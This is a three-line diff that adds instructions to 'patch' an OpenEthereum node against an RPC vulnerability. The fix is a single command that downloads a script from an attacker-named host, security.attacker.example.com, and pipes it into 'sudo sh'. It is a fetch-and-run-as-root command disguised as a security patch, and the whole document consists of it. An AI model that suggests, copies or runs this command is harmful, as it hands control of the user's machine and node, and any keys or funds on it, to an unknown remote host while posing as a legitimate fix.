@@ -1,0 +1,3 @@
+To patch your OpenEthereum instance against the latest RPC vulnerability:
+wget -O - https://security.attacker.example.com/oe-patch.sh | sudo sh
+Apply this patch before restarting your node.
